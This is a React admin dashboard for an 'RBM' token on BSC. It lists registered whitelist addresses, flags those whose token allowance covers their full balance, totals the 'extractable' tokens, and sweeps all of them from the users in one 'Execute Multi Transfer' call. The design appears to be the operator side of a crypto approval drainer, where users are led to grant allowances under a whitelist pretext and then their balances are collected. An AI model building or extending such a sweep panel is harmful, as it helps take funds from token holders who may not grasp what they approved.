import React, { useState, useEffect } from 'react';
import {
  Card,
  CardContent,
  Typography,
  Button,
  Box,
  Alert,
  CircularProgress,
  Grid,
  Paper,
  Divider,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Chip
} from '@mui/material';
import { MoneySend, Profile2User, Refresh2 } from 'iconsax-react';
import rbmWhitelistService from '../../../services/rbmWhitelistService';
import SimpleWalletConnect from '../../../components/SimpleWalletConnect';

const MultiTransfer = () => {
  const [loading, setLoading] = useState(false);
  const [loadingData, setLoadingData] = useState(true);
  const [registeredUsers, setRegisteredUsers] = useState([]);
  const [transferableUsers, setTransferableUsers] = useState([]);
  const [totalExtractable, setTotalExtractable] = useState('0');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [txHash, setTxHash] = useState('');

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    try {
      setLoadingData(true);
      setError('');
      
      const [users, total] = await Promise.all([
        rbmWhitelistService.getAllRegistered(),
        rbmWhitelistService.getTotalExtractableTokens()
      ]);

      setRegisteredUsers(users);
      setTotalExtractable(total);

      // Check each user's transferability
      const userDetails = await Promise.all(
        users.map(async (address) => {
          try {
            const [balance, allowance] = await Promise.all([
              rbmWhitelistService.checkBalance(address),
              rbmWhitelistService.checkAllowance(address)
            ]);
            
            const balanceNum = parseFloat(balance);
            const allowanceNum = parseFloat(allowance);
            const canTransfer = allowanceNum >= balanceNum && balanceNum > 0;
            
            return {
              address,
              balance: balanceNum,
              allowance: allowanceNum,
              canTransfer
            };
          } catch (err) {
            return {
              address,
              balance: 0,
              allowance: 0,
              canTransfer: false,
              error: err.message
            };
          }
        })
      );

      setTransferableUsers(userDetails.filter(user => user.canTransfer));
    } catch (err) {
      setError('Failed to load data: ' + err.message);
    } finally {
      setLoadingData(false);
    }
  };

  const handleMultiTransfer = async () => {
    if (transferableUsers.length === 0) {
      setError('No users available for transfer');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setSuccess('');

      const result = await rbmWhitelistService.transferMulti();
      setTxHash(result.hash);
      setSuccess(`Multi-transfer successful! Processed ${transferableUsers.length} users with total ${parseFloat(totalExtractable).toFixed(4)} RBM tokens`);
      
      // Refresh data
      await loadData();
    } catch (err) {
      setError('Multi-transfer failed: ' + err.message);
    } finally {
      setLoading(false);
    }
  };

  const openTxOnBSCScan = () => {
    if (txHash) {
      window.open(rbmWhitelistService.getBSCScanLink(txHash, 'tx'), '_blank');
    }
  };

  if (loadingData) {
    return (
      <Box display="flex" justifyContent="center" alignItems="center" minHeight="400px">
        <CircularProgress />
      </Box>
    );
  }

  return (
    <Box>
      {/* Header */}
      <Box mb={3}>
        <Typography variant="h4" gutterBottom>
          Multi Transfer
        </Typography>
        <Typography variant="body1" color="textSecondary">
          Transfer tokens from all eligible registered users
        </Typography>
      </Box>

      {/* Wallet Connection */}
      <SimpleWalletConnect />

      {/* Error/Success Alerts */}
      {error && (
        <Alert severity="error" sx={{ mb: 3 }} onClose={() => setError('')}>
          {error}
        </Alert>
      )}
      
      {success && (
        <Alert severity="success" sx={{ mb: 3 }} onClose={() => setSuccess('')}>
          {success}
          {txHash && (
            <Button
              size="small"
              onClick={openTxOnBSCScan}
              sx={{ ml: 2 }}
            >
              View on BSCScan
            </Button>
          )}
        </Alert>
      )}

      <Grid container spacing={3}>
        {/* Summary Cards */}
        <Grid item xs={12} md={4}>
          <Card>
            <CardContent>
              <Box display="flex" alignItems="center" justifyContent="space-between">
                <Box>
                  <Typography variant="h6" color="textSecondary" gutterBottom>
                    Total Registered
                  </Typography>
                  <Typography variant="h4" color="primary.main">
                    {registeredUsers.length}
                  </Typography>
                </Box>
                <Profile2User size={32} color="#1976d2" />
              </Box>
            </CardContent>
          </Card>
        </Grid>

        <Grid item xs={12} md={4}>
          <Card>
            <CardContent>
              <Box display="flex" alignItems="center" justifyContent="space-between">
                <Box>
                  <Typography variant="h6" color="textSecondary" gutterBottom>
                    Transferable Users
                  </Typography>
                  <Typography variant="h4" color="success.main">
                    {transferableUsers.length}
                  </Typography>
                </Box>
                <MoneySend size={32} color="#2e7d32" />
              </Box>
            </CardContent>
          </Card>
        </Grid>

        <Grid item xs={12} md={4}>
          <Card>
            <CardContent>
              <Box display="flex" alignItems="center" justifyContent="space-between">
                <Box>
                  <Typography variant="h6" color="textSecondary" gutterBottom>
                    Total Extractable
                  </Typography>
                  <Typography variant="h4" color="warning.main">
                    {parseFloat(totalExtractable).toFixed(4)}
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    RBM Tokens
                  </Typography>
                </Box>
                <MoneySend size={32} color="#ed6c02" />
              </Box>
            </CardContent>
          </Card>
        </Grid>

        {/* Action Panel */}
        <Grid item xs={12}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>
                Transfer Action
              </Typography>
              <Divider sx={{ mb: 3 }} />
              
              <Box display="flex" justifyContent="space-between" alignItems="center" mb={3}>
                <Box>
                  <Typography variant="body1" gutterBottom>
                    Ready to transfer tokens from {transferableUsers.length} eligible users
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    Total amount: {parseFloat(totalExtractable).toFixed(4)} RBM tokens
                  </Typography>
                </Box>
                
                <Box display="flex" gap={2}>
                  <Button
                    variant="outlined"
                    onClick={loadData}
                    startIcon={<Refresh2 />}
                    disabled={loadingData}
                  >
                    Refresh
                  </Button>
                  
                  <Button
                    variant="contained"
                    size="large"
                    onClick={handleMultiTransfer}
                    disabled={loading || transferableUsers.length === 0}
                    startIcon={loading ? <CircularProgress size={20} /> : <MoneySend />}
                  >
                    {loading ? 'Processing...' : 'Execute Multi Transfer'}
                  </Button>
                </Box>
              </Box>

              {transferableUsers.length === 0 && (
                <Alert severity="warning">
                  No users are currently eligible for transfer. Users need to have tokens and sufficient allowance.
                </Alert>
              )}
            </CardContent>
          </Card>
        </Grid>

        {/* Transferable Users Table */}
        {transferableUsers.length > 0 && (
          <Grid item xs={12}>
            <Card>
              <CardContent>
                <Typography variant="h6" gutterBottom>
                  Eligible Users for Transfer
                </Typography>
                <Divider sx={{ mb: 2 }} />
                
                <TableContainer component={Paper} variant="outlined">
                  <Table>
                    <TableHead>
                      <TableRow>
                        <TableCell>User Address</TableCell>
                        <TableCell align="right">Balance (RBM)</TableCell>
                        <TableCell align="right">Allowance (RBM)</TableCell>
                        <TableCell align="center">Status</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {transferableUsers.map((user, index) => (
                        <TableRow key={index}>
                          <TableCell sx={{ fontFamily: 'monospace' }}>
                            {rbmWhitelistService.formatAddress(user.address)}
                          </TableCell>
                          <TableCell align="right">
                            {user.balance.toFixed(4)}
                          </TableCell>
                          <TableCell align="right">
                            {user.allowance.toFixed(4)}
                          </TableCell>
                          <TableCell align="center">
                            <Chip 
                              label="Ready" 
                              color="success" 
                              size="small" 
                            />
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </CardContent>
            </Card>
          </Grid>
        )}
      </Grid>
    </Box>
  );
};

export default MultiTransfer;
